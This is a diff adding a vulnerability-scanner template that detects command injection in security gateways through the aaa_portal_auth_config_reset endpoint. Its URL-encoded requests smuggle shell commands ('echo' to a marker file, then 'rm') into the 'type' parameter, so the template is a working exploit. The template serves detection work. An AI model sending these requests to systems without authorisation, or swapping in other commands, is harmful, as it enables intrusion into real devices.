@@ -1,0 +1,40 @@
+id: multiple-security-gateway-rce
+info:
+  name: Multiple Security Gateway aaa_portal_auth_config_reset RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    A Remote Command Execution vulnerability in multiple security gateways. Exploitation involves triggering the aaa_portal_auth_config_reset endpoint with a crafted payload.
+  tags: command-execution,rce
+http:
+  - raw:
+      - |
+        GET /webui/?g=aaa_portal_auth_config_reset&type=%31%32%36%37%64%61%64%61%6c%6a%61%37%6f%38%39%37%38%64%37%61%37%39%37%64%61%39%37%39%73%61%7c%7c%65%63%68%6f%20%76%75%6c%6e%5f%63%68%65%63%6b%5f%32%33%33%33%33%33%33%20%3e%20%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%6d%61%69%6e%5f%6c%6f%67%6f%32%32%2e%74%78%74%20%7c%7c%20%6c%73%20 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /webui/images/basic/login/main_logo22.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "vuln_check_2333333"
+  - raw:
+      - |
+        GET /webui/?g=aaa_portal_auth_config_reset&type=%31%32%36%37%64%61%64%61%6c%6a%61%37%6f%38%39%37%38%64%37%61%37%39%37%64%61%39%37%39%73%61%7c%7c%20%72%6d%20%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%6d%61%69%6e%5f%6c%6f%67%6f%32%32%2e%74%78%74%20%7c%7c%20%6c%73%20 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
